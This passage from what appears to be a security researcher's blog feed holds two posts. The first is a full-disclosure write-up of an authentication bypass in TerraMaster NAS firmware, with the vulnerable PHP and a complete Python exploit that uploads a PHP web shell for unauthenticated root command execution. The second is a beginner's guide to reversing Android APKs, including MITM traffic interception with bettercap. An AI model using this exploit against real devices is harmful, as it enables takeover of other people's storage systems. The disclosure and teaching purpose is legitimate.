<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line">...</div><div class="line">...</div><div class="line">$targetDir = $_REQUEST[<span class="string">'targetDir'</span>];</div><div class="line">$file_path = @realpath($targetDir);</div><div class="line"><span class="keyword">if</span>(strstr($file_path, <span class="string">"/mnt/base/update"</span>) === <span class="keyword">false</span>)&#123;</div><div class="line">	<span class="keyword">if</span>(!$_COOKIE[<span class="string">'kod_name'</span>])&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 104, "message": "You are not login!"&#125;, "id" : "id"&#125;'</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">...</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>
<p>TL;DR; As long as you set the <code>kod_name</code> cookie to <strong>any</strong> value, the system considers you as authenticated and lets you <strong>upload any file to any location on the file system</strong> … oh, did I mention that the web server <strong>is running as root</strong>? </p>
<p><img src="/images/2015/Jan/major-facepalm.jpg" alt="facepalm"></p>
<p>I contacted the vendor on May 11 and initially they seemed to care assuring me an update would have been released in a couple of days … 19 days ellapsed, still no fixes and they’re ignoring my emails now, so I decided to go full disclosure.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># coding: utf8</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Exploit: Unauthenticated RCE as root.</span></div><div class="line"><span class="comment"># Vendor: TerraMaster</span></div><div class="line"><span class="comment"># Product: TOS &lt;= 3.0.30 (running on every NAS)</span></div><div class="line"><span class="comment"># Author: Simone 'evilsocket' Margaritelli &lt;evilsocket@protonmail.com&gt; </span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">( address, port, filename, path = <span class="string">'/usr/www/'</span> )</span>:</span></div><div class="line">    url = <span class="string">"http://%s:%d/include/upload.php?targetDir=%s"</span> % ( address, port, path )</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        files = &#123; <span class="string">'file'</span>: open( filename, <span class="string">'rb'</span> ) &#125;</div><div class="line">        cookies = &#123; <span class="string">'kod_name'</span>: <span class="string">'1'</span> &#125; <span class="comment"># LOL :D</span></div><div class="line">        r = requests.post(url, files=files, cookies=cookies)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> r.text != <span class="string">'&#123;"jsonrpc" : "2.0", "result" : null, "id" : "id"&#125;'</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"! Unexpected response, exploit might not work:\n%s\n"</span> % r.text</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">print</span> <span class="string">"\n! ERROR: %s"</span> % e</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span><span class="params">( address, port, command )</span>:</span></div><div class="line">    <span class="keyword">with</span> open( <span class="string">'/tmp/p.php'</span>, <span class="string">'w+t'</span> ) <span class="keyword">as</span> fp:</div><div class="line">        fp.write( <span class="string">"&lt;?php system('%s'); ?&gt;"</span> % command )</div><div class="line"></div><div class="line">    <span class="keyword">if</span> upload( address, port, <span class="string">'/tmp/p.php'</span> ) == <span class="keyword">True</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            url = <span class="string">"http://%s:%d/p.php"</span> % ( address, port )</div><div class="line">            <span class="keyword">return</span> requests.get(url).text</div><div class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">            <span class="keyword">print</span> <span class="string">"\n! ERROR: %s"</span> % e</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Usage: exploit.py &lt;ip|hostname&gt; &lt;command&gt; (port=8181)\n"</span></div><div class="line">    quit()</div><div class="line"></div><div class="line">target  = sys.argv[<span class="number">1</span>]</div><div class="line">command = sys.argv[<span class="number">2</span>]</div><div class="line">port    = <span class="number">8181</span> <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">4</span> <span class="keyword">else</span> int(sys.argv[<span class="number">3</span>])</div><div class="line"></div><div class="line">out = rce( target, port, command )</div><div class="line"><span class="keyword">if</span> out <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">    <span class="keyword">print</span> out.strip()</div></pre></td></tr></table></figure>
<h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><ul>
<li>Use a firewall to disable access to port <code>8181</code> of the NAS from untrusted users.</li>
<li>If possible (NAS only used via SMB/NFS/SSH) completely delete the web ui.</li>
<li>Hope for the vendor to quickly release a fix.</li>
<li>Alternatively, <strong>buy another and more secure NAS</strong> :)</li>
</ul>
<h3 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h3><ul>
<li>11 May 2017: Initial report to TerraMaster.</li>
<li>12 May 2017: TM acknowledged the issue and promised a fix within <em>a couple of days</em>.</li>
<li>16 May 2017: Follow up, still no fix.</li>
<li>25 May 2017: Follow up, still no fix.</li>
<li>29 May 2017: Follow up, still no fix and no answers neither.</li>
<li>30 May 2017: Disclosure.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Recently I bought a TerraMaster F2-420 NAS from Amazon in order to store my private code, backups and this kind of stuff. As soon as it arrived I started to play with its web interface and eventually I wanted to see how it was implemented, moreover I was curious to see if I could find any remotely exploitable vulnerability.&lt;/p&gt;
&lt;p&gt;As you can see … I succeeded :)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/05/exploit.png&quot; alt=&quot;nas&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="vulnerability" scheme="https://www.evilsocket.net/tags/vulnerability/"/>
    
      <category term="exploit" scheme="https://www.evilsocket.net/tags/exploit/"/>
    
      <category term="rce" scheme="https://www.evilsocket.net/tags/rce/"/>
    
      <category term="disclosure" scheme="https://www.evilsocket.net/tags/disclosure/"/>
    
      <category term="terramaster" scheme="https://www.evilsocket.net/tags/terramaster/"/>
    
      <category term="nas" scheme="https://www.evilsocket.net/tags/nas/"/>
    
  </entry>
  
  <entry>
    <title>Android Applications Reversing 101</title>
    <link href="https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/"/>
    <id>https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/</id>
    <published>2017-04-27T17:09:48.000Z</published>
    <updated>2017-08-11T14:28:47.023Z</updated>
    
    <content type="html"><![CDATA[<p>Every day we see a bunch of new Android applications being published on the Google Play Store, from games, to utilities, to IoT devices clients and so forth, almost every single aspect of our life can be somehow controlled with “an app”. We have smart houses, <a href="https://www.evilsocket.net/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">smart fitness devices</a> and <a href="https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/">smart coffee machines</a> … but is this stuff just smart or is it <strong>secure</strong> as well? :)</p>
<p>Reversing an Android application can be a (relatively) easy and fun way to answer this question, that’s why I decided to write this blog post where I’ll try to explain the basics and give you some of my “tricks” to reverse this stuff faster and more effectively.</p>
<p>I’m not going to go very deep into technical details, you can learn yourself how Android works, how the Dalvik VM works and so forth, this is gonna be a <strong>very basic practical guide</strong> instead of a post full of theoretical stuff but no really useful contents.</p>
<p>Let’s start! :)</p>
<p><img src="/images/2017/04/head.jpeg" alt="start"></p>
<a id="more"></a>
<h3 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h3><p>In order to follow this introduction to APK reversing there’re a few prerequisites:</p>
<ul>
<li>A working brain ( I don’t give this for granted anymore … ).</li>
<li>An Android smartphone ( doh! ).</li>
<li>You have a basic knowledge of the <a href="https://en.wikipedia.org/wiki/Java_(programming_language" target="_blank" rel="external">Java programming language</a> (you understand it if you read it).</li>
<li>You have the <a href="http://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html" target="_blank" rel="external">JRE</a> installed on your computer.</li>
<li>You have <a href="https://developer.android.com/studio/command-line/adb.html" target="_blank" rel="external">adb</a> installed.</li>
<li>You have the <code>Developer Options</code> and <code>USB Debugging</code> enabled on your smartphone.</li>
</ul>
<h3 id="What-is-an-APK"><a href="#What-is-an-APK" class="headerlink" title="What is an APK?"></a>What is an APK?</h3><p>An Android application is packaged as an <strong>APK</strong> ( <em>Android Package</em> ) file, which is essentially a ZIP file containing the compiled code, the resources, signature, manifest and every other file the software needs in order to run. Being it a ZIP file, we can start looking at its contents using the <code>unzip</code> command line utility ( or any other unarchiver you use ):</p>
<pre><code>unzip application.apk -d application
</code></pre><p>Here’s what you will find inside an APK.</p>
<pre><code>/AndroidManifest.xml (file)
</code></pre><p>This is the binary representation of the XML manifest file describing what permissions the application will request (keep in mind that some of the permissions might be requested at runtime by the app and not declared here), what activities ( GUIs ) are in there, what services ( stuff running in the background with no UI ) and what receivers ( classes that can receive and handle system events such as the device boot or an incoming SMS ). </p>
<p>Once decompiled (more on this later), it’ll look like this:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">package</span>=<span class="string">"com.company.appname"</span> </span></div><div class="line"><span class="tag">                                                                     <span class="attr">platformBuildVersionCode</span>=<span class="string">"24"</span> </span></div><div class="line"><span class="tag">                                                                     <span class="attr">platformBuildVersionName</span>=<span class="string">"7.0"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span> <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span> </span></div><div class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> </span></div><div class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span> <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.company.appname.MainActivity"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></div><div class="line">    </div><div class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></div></pre></td></tr></table></figure>
<p>Keep in mind that this is the perfect starting point to isolate the application “entry points”, namely the classes you’ll reverse first in order to understand the logic of the whole software. In this case for instance, we would start inspecting the <code>com.company.appname.MainActivity</code> class being it declared as the main UI for the application.</p>
<pre><code>/assets/* ( folder )
</code></pre><p>This folder will contain application specific files, like wav files the app might need to play, custom fonts and so on. Reversing-wise it’s usually not very important, unless of course you find inside the software functional references to such files.</p>
<pre><code>/res/* ( folder )
</code></pre><p>All the resources, like the activities xml files, images and custom styles are stored here.</p>
<pre><code>/resources.arsc ( file )
</code></pre><p>This is the “index” of all the resources, long story short, at each resource file is assigned a numeric identifier that the app will use in order to identify that specific entry and the <code>resources.arsc</code> file maps these files to their identifiers … nothing very interesting about it.</p>
<pre><code>/classes.dex ( file )
</code></pre><p>This file contains the Dalvik ( the virtual machine running Android applications ) bytecode of the app, let me explain it better. An Android application is (most of the times) developed using the Java programming language. The java source files are then compiled into this bytecode which the Dalvik VM eventually will execute … pretty much what happens to normal Java programs when they’re compiled to <code>.class</code> files.</p>
<p>Long story short, this file contains the logic, that’s what we’re interested into.</p>
<p>Sometimes you’ll also find a <code>classes2.dex</code> file, this is due to the DEX format which has a limit to the number of classes you can declare inside a single dex file, at some point in history Android apps became bigger and bigger and so Google had to adapt this format, supporting a secondary <code>.dex</code> file where other classes can be declared.</p>
<p>From our perspective it doesn’t matter, the tools we’re going to use are able to detect it and append it to the decompilation pipeline.</p>
<pre><code>/libs/ ( folder )
</code></pre><p>Sometimes an app needs to execute native code, it can be an image processing library, a game engine or whatever. In such case, those <code>.so</code> ELF libraries will be found inside the <code>libs</code> folder, divided into architecture specific subfolders ( so the app will run on ARM, ARM64, x86, etc ).</p>
<pre><code>/META-INF/ ( folder )
</code></pre><p>Every Android application needs to be signed with a developer certificate in order to run on a device, even debug builds are signed by a debug certificate, the <code>META-INF</code> folder contains information about the files inside the APK and about the developer.</p>
<p>Inside this folder, you’ll usually find:</p>
<ul>
<li>A <code>MANIFEST.MF</code> file with the SHA-1 or SHA-256 hashes of <strong>all</strong> the files inside the APK.</li>
<li>A <code>CERT.SF</code> file, pretty much like the MANIFEST.MF, but signed with the <code>RSA</code> key.</li>
<li>A <code>CERT.RSA</code> file which contains the developer public key used to sign the <code>CERT.SF</code> file and digests.</li>
</ul>
<p>Those files are very important in order to guarantee the APK integrity and the ownership of the code. Sometimes inspecting such signature can be very handy to determine who really developed a given APK. If you want to get information about the developer, you can use the <code>openssl</code> command line utility:</p>
<pre><code>openssl pkcs7 -in /path/to/extracted/apk/META-INF/CERT.RSA -inform DER -print
</code></pre><p>This will print an output like:</p>
<pre><code>PKCS7: 
  type: pkcs7-signedData (1.2.840.113549.1.7.2)
  d.sign: 
    version: 1
    md_algs:
        algorithm: sha1 (1.3.14.3.2.26)
        parameter: NULL
    contents: 
      type: pkcs7-data (1.2.840.113549.1.7.1)
      d.data: &lt;ABSENT&gt;
    cert:
        cert_info: 
          version: 2
          serialNumber: 10394279457707717180
          signature: 
            algorithm: sha1WithRSAEncryption (1.2.840.113549.1.1.5)
            parameter: NULL
          issuer: C=TW, ST=Taiwan, L=Taipei, O=ASUS, OU=PMD, CN=ASUS AMAX Key/emailAddress=admin@asus.com
          validity: 
            notBefore: Jul  8 11:39:39 2013 GMT
            notAfter: Nov 23 11:39:39 2040 GMT
          subject: C=TW, ST=Taiwan, L=Taipei, O=ASUS, OU=PMD, CN=ASUS AMAX Key/emailAddress=admin@asus.com
          key: 
            algor: 
              algorithm: rsaEncryption (1.2.840.113549.1.1.1)
              parameter: NULL
            public_key:  (0 unused bits)
              ...
              ...
              ...
</code></pre><p>This can be gold for us, for instance we could use this information to determine if an app was really signed by (let’s say) Google or if it was resigned, therefore modified, by a third party.</p>
<h3 id="How-do-I-get-the-APK-of-an-app"><a href="#How-do-I-get-the-APK-of-an-app" class="headerlink" title="How do I get the APK of an app?"></a>How do I get the APK of an app?</h3><p>Now that we have a basic idea of what we’re supposed to find inside an APK, we need a way to actually get the APK file of the application we’re interested into. There are two ways, either you install it on your device and use <code>adb</code> to get it, or you use an online service to download it.</p>
<h5 id="Pulling-an-app-with-ADB"><a href="#Pulling-an-app-with-ADB" class="headerlink" title="Pulling an app with ADB"></a>Pulling an app with ADB</h5><p>First of all let’s plug our smartphone to the USB port of our computer and get a list of the installed packages and their namespaces:</p>
<pre><code>adb shell pm list packages
</code></pre><p>This will list all packages on your smartphone, once you’ve found the namespace of the package you want to reverse ( <code>com.android.systemui</code> in this example ), let’s see what its physical path is:</p>
<pre><code>adb shell pm path com.android.systemui
</code></pre><p>Finally, we have the APK path:</p>
<pre><code>package:/system/priv-app/SystemUIGoogle/SystemUIGoogle.apk
</code></pre><p>Let’s pull it from the device:</p>
<pre><code>adb pull /system/priv-app/SystemUIGoogle/SystemUIGoogle.apk
</code></pre><p>And here you go, you have the APK you want to reverse!</p>
<h5 id="Using-an-Online-Service"><a href="#Using-an-Online-Service" class="headerlink" title="Using an Online Service"></a>Using an Online Service</h5><p>Multiple online services are available if you don’t want to install the app on your device (for instance, if you’re reversing a malware, you want to start having the file first, then installing on a clean device only afterwards), here’s a list of the ones I use:</p>
<ul>
<li><a href="https://apk-dl.com/" target="_blank" rel="external">Apk-DL</a></li>
<li><a href="https://apps.evozi.com/apk-downloader/" target="_blank" rel="external">Evozi Downloader</a></li>
<li><a href="http://apkleecher.com/" target="_blank" rel="external">Apk Leecher</a></li>
</ul>
<p>Keep in mind that once you download the APK from these services, it’s a good idea to check the developer certificate as previously shown in order to be 100% sure you downloaded the correct APK and not some repackaged and resigned stuff full of ads and possibly malware.</p>
<h3 id="Network-Analysis"><a href="#Network-Analysis" class="headerlink" title="Network Analysis"></a>Network Analysis</h3><p>Now we start with some tests in order to understand what the app is doing while executed. My first test usually consists in inspecting the network traffic being generated by the application itself and, in order to do that, my tool of choice is <a href="https://bettercap.org/" target="_blank" rel="external">bettercap</a> … well, that’s why I developed it in the first place :P</p>
<p>Make sure you have bettercap installed and that both your computer and the Android device are on the same wifi network, then you can start MITM-ing the smartphone ( <code>192.168.1.5</code> in this example ) and see its traffic in realtime from the terminal:</p>
<pre><code>sudo bettercap -T 192.168.1.5 -X
</code></pre><p>The <code>-X</code> option will enable the sniffer, as soon as you start the app you should see a bunch of HTTP and/or HTTPS servers being contacted, now you know who the app is sending the data to, let’s now see <strong>what</strong> data it is sending:</p>
<pre><code>sudo bettercap -T 192.168.1.5 --proxy --proxy-https --no-sslstrip
</code></pre><p>This will switch from passive sniffing mode, to proxying mode. All the HTTP and HTTPS traffic will be intercepted (and, if neeeded, modified) by bettercap.<br>If the app is correctly using <a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning" target="_blank" rel="external">public key pinning</a> (<strong>as every application should</strong>) you will <strong>not</strong> be able to see its HTTPS traffic but, unfortunately, in my experience this only happens for a very small number of apps.</p>
<p>From now on, keep triggering actions on the app while inspecting the traffic ( you can also use <code>Wireshark</code> in parallel to get a <code>PCAP</code> capture file to inspect it later ) and after a while you should have a more or less complete idea of what protocol it’s using and for what purpose.</p>
<p><img src="/images/2017/04/bettercap.png" alt="bettercap"></p>
<h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>After the network analysis, we collected a bunch of URLs and packets, we can use this information as our starting point, that’s what we will be looking for while performing static analysis on the app. “Static analysis” means that you will <strong>not</strong> execute the app now, but you’ll rather just study its code. Most of the times this is all you’ll ever need to reverse something.</p>
<p>There’re different tools you can use for this purpose, let’s take a look at the most popular ones.</p>
<h4 id="apktool"><a href="#apktool" class="headerlink" title="apktool"></a>apktool</h4><p><a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="external">APKTool</a> is the very first tool you want to use, it is capable of decompiling the <code>AndroidManifest</code> file to its original XML format, the <code>resources.arsc</code> file and it will also convert the <code>classes.dex</code> ( and <code>classes2.dex</code> if present ) file to an intermediary language called <code>SMALI</code>, an ASM-like language used to represent the Dalvik VM opcodes as a human readable language.</p>
<p>It looks like:</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></div><div class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> main([<span class="class">Ljava/lang/String;</span>)V</div><div class="line"><span class="keyword">    .registers</span> 2</div><div class="line">   <span class="built_in"> sget-object </span>v0, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></div><div class="line">   <span class="built_in"> const-string	</span>v1, <span class="string">"Hello World!"</span></div><div class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, v1&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(<span class="class">Ljava/lang/String;</span>)V</div><div class="line">    return-void</div><div class="line"><span class="keyword">.end method</span></div></pre></td></tr></table></figure>
<p>But don’t worry, in most of the cases this is not the final language you’re gonna read to reverse the app ;)</p>
<p>Given an APK, this command line will decompile it:</p>
<pre><code>apktool d application.apk
</code></pre><p>Once finished, the <code>application</code> folder is created and you’ll find all the output of apktool in there.</p>
<p>You can also use <code>apktool</code> to decompile an APK, modify it and then recompile it ( like <a href="https://www.evilsocket.net/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">i did</a> with the Nike+ app in order to have more debug logs for instance ), but unless the other tools will fail the decompilation, it’s unlikely that you’ll need to read <code>smali</code> code in order to reverse the application, let’s get to the other tools now ;)</p>
<h4 id="jADX"><a href="#jADX" class="headerlink" title="jADX"></a>jADX</h4><p>The <a href="https://github.com/skylot/jadx" target="_blank" rel="external">jADX</a> suite allows you to simply load an APK and look at its Java source code. What’s happening under the hood is that jADX is decompiling the APK to smali and then converting the smali back to Java. Needless to say, reading Java code is much easier than reading smali as I already mentioned :)</p>
<p>Once the APK is loaded, you’ll see a UI like this:</p>
<p><img src="https://camo.githubusercontent.com/bd3c0ea851c23c4535e43590a86c940a0786faa6/687474703a2f2f736b796c6f742e6769746875622e696f2f6a6164782f6a6164782d6775692e706e67" alt="jADX"></p>
<p>One of the best features of jADX is the string/symbol search ( the <img style="display:inline" src="https://raw.githubusercontent.com/skylot/jadx/master/jadx-gui/src/main/resources/icons-16/wand.png"> button ) that will allow you to search for URLs, strings, methods and whatever you want to find inside the codebase of the app.</p>
<p>Also, there’s the <code>Find Usage</code> menu option, just highlight some symbol and right click on it, this feature will give you a list of every references to that symbol.</p>
<h4 id="Dex2Jar-and-JD-Gui"><a href="#Dex2Jar-and-JD-Gui" class="headerlink" title="Dex2Jar and JD-Gui"></a>Dex2Jar and JD-Gui</h4><p>Similar to jADX are the <a href="https://sourceforge.net/projects/dex2jar/" target="_blank" rel="external">dex2jar</a> and <a href="http://jd.benow.ca/" target="_blank" rel="external">JD-GUI</a> tools, once installed, you’ll use <code>dex2jar</code> to convert an APK to a JAR file:</p>
<pre><code>/path/to/dex2jar/d2j-dex2jar.sh application.apk
</code></pre><p>Once you have the JAR file, simply open it with JD-GUI and you’ll see its Java code, pretty much like jADX:</p>
<p><img src="http://jd.benow.ca/img/screenshot17.png" alt="JD-GUI"></p>
<p>Unfortunately JD-GUI is not as features rich as jADX, but sometimes when one tool fails you have to try another one and hope to be more lucky.</p>
<h4 id="JEB"><a href="#JEB" class="headerlink" title="JEB"></a>JEB</h4><p>As your last resort, you can try the <a href="https://www.pnfsoftware.com/jeb2/" target="_blank" rel="external">JEB</a> decompiler. It’s a <strong>very</strong> good software, but unfortunately it’s not free, there’s a trial version if you want to give it a shot, here’s how it looks like:</p>
<p><img src="/images/2017/04/jeb.png" alt="JEB"></p>
<p>JEB also features an ARM disassembler ( useful when there’re native libraries in the APK ) and a debugger ( <strong>very</strong> useful for dynamic analysis ), but again, it’s not free and it’s not cheap.</p>
<h4 id="Static-Analysis-of-Native-Binaries"><a href="#Static-Analysis-of-Native-Binaries" class="headerlink" title="Static Analysis of Native Binaries"></a>Static Analysis of Native Binaries</h4><p>As previously mentioned, sometimes you’ll find native libraries ( <code>.so</code> shared objects ) inside the <code>lib</code> folder of the APK and, while reading the Java code, you’ll find <code>native</code> methods declarations like the following:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI</span><span class="params">()</span></span>;</div></pre></td></tr></table></figure>
<p>The <code>native</code> keyword means that the method implementation is not inside the <code>dex</code> file but, instead, it’s declared and executed from native code trough what is called a <code>Java Native Interface</code> or <a href="https://developer.android.com/ndk/samples/sample_hellojni.html" target="_blank" rel="external">JNI</a>.</p>
<p>Close to native methods you’ll also usually find something like this:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">System.loadLibrary(<span class="string">"hello-jni"</span>);</div></pre></td></tr></table></figure>
<p>Which will tell you in which native library the method is implemented. In such cases, you will need an ARM ( or x86 if there’s a x86 subfolder inside the <code>libs</code> folder ) disassembler in order to reverse the native object.</p>
<h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h5><p>The very first disassembler and decompiler that every decent reverser should know about is <a href="https://www.hex-rays.com/products/decompiler/" target="_blank" rel="external">Hex-Rays IDA</a> which is the state of the art reversing tool for native code. Along with an IDA license, you can also buy a <code>decompiler</code> license, in which case IDA will also be able to rebuild pseudo C-like code from the assembly, allowing you to read an higher level representation of the library logic.</p>
<p><img src="/images/2017/04/ida.gif" alt="IDA"></p>
<p>Unfortunately IDA is a very expensive software and, unless you’re reversing native stuff professionaly, it’s really not worth spending all those money for a single tool … <small>warez</small> … ehm … :P</p>
<h5 id="Hopper"><a href="#Hopper" class="headerlink" title="Hopper"></a>Hopper</h5><p>If you’re on a budget but you need to reverse native code, instead of IDA you can give <a href="https://www.hopperapp.com/" target="_blank" rel="external">Hopper</a> a try. It’s definitely not as good and complete as IDA, but it’s much cheaper and will be good enough for most of the cases.</p>
<p>Hopper supports GNU/Linux and macOS ( no Windows! ) and, just like IDA, has a builtin decompiler which is quite decent considering its price:</p>
<p><img src="/images/2017/04/hopper.jpg" alt="Hopper"></p>
<h3 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h3><p>When static analysis is not enough, maybe because the application is <a href="https://www.evilsocket.net/2016/04/18/how-i-defeated-an-obfuscated-and-anti-tamper-apk-with-some-python-and-a-home-made-smali-emulator/">obfuscated</a> or the codebase is simply too big and complex to quickly isolate the routines you’re interested into, you need to go dynamic.</p>
<p>Dynamic analysis simply means that you’ll execute the app ( like we did while performing network analysis ) and somehow trace into its execution using different tools, strategies and methods.</p>
<h4 id="Sandboxing"><a href="#Sandboxing" class="headerlink" title="Sandboxing"></a>Sandboxing</h4><p>Sandboxing is a black-box dynamic analysis strategy, which means you’re not going to actively trace <strong>into</strong> the application code ( like you do while debugging ), but you’ll execute the app into some container that will log the most relevant actions for you and will present a report at the end of the execution.</p>
<h5 id="Cuckoo-Droid"><a href="#Cuckoo-Droid" class="headerlink" title="Cuckoo-Droid"></a>Cuckoo-Droid</h5><p><a href="https://github.com/idanr1986/cuckoo-droid" target="_blank" rel="external">Cuckoo-Droid</a> is an Android port of the famous Cuckoo sandbox, once installed and configured, it’ll give you an activity report with all the URLs the app contacted, all the DNS queries, API calls and so forth:</p>
<p><img src="/images/2017/04/cuckoo.png" alt="Cuckoo"></p>
<h5 id="Joe-Sandbox"><a href="#Joe-Sandbox" class="headerlink" title="Joe Sandbox"></a>Joe Sandbox</h5><p>The mobile <a href="https://www.joesecurity.org/joe-sandbox-mobile" target="_blank" rel="external">Joe Sandbox</a> is a great online service that allows you to upload an APK and get its activity report without the hassle of installing or configuring anything.</p>
<p>This is a <a href="https://www.joesecurity.org/reports/report-14d9f1a92dd984d6040cc41ed06e273e.html" target="_blank" rel="external">sample report</a>, as you can see the kind of information is pretty much the same as Cuckoo-Droid, plus there’re a bunch of heuristics being executed in order to behaviourally correlate the sample to other known applications.</p>
